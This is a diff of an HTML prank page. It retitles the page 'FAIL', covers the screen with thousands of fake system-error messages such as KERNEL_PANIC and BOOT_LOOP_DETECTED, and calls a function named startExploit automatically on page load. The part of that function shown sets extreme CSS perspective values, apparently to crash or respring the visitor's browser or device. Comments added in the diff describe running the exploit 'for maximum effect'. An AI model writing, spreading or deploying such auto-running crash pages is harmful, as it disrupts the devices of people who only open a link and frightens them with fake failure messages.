@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Respring</title>
+    <title>FAIL</title>
     <style>
         body {
-            background: #450a0a;
+            background: #450a0a; /* Dark red from section phase in second.html */
             color: #ffffff;
             margin: 0;
             padding: 0;
@@ -36,12 +36,21 @@
     </div>
 
     <script>
+        // Fill background with small error messages - pushed to 3000 for total coverage
         const errorTemplates = [
-            "Fatal Error 0x3333", "KERNEL_PANIC", "OVERFLOW_DETECTION", "STACK_COLLISION", 
-            "MEMORY_CORRUPTION", "0xFFFF_SYSTEM_HALT", "CRITICAL_PROCESS_DIED", 
-            "THREAD_STUCK_IN_DEVICE_DRIVER", "BOOT_LOOP_DETECTED", "FS_CORRUPTION"
+            "Fatal Error 0x3333",
+            "KERNEL_PANIC",
+            "OVERFLOW_DETECTION",
+            "STACK_COLLISION",
+            "MEMORY_CORRUPTION",
+            "0xFFFF_SYSTEM_HALT",
+            "CRITICAL_PROCESS_DIED",
+            "THREAD_STUCK_IN_DEVICE_DRIVER",
+            "BOOT_LOOP_DETECTED",
+            "FS_CORRUPTION"
         ];
         
+        // Generating massive amount of elements to ensure zero gaps
         for(let i=0; i<3000; i++) {
             const span = document.createElement('span');
             span.className = 'error-msg';
@@ -49,6 +58,7 @@
             document.body.appendChild(span);
         }
 
+        // Directly executing the exploit in the top level for maximum effect
         function startExploit() {
             const container = document.createElement('div');
             container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
@@ -69,6 +79,7 @@
             }, 0);
         }
 
+        // Start immediately on load
         window.onload = startExploit;
     </script>
 </body>
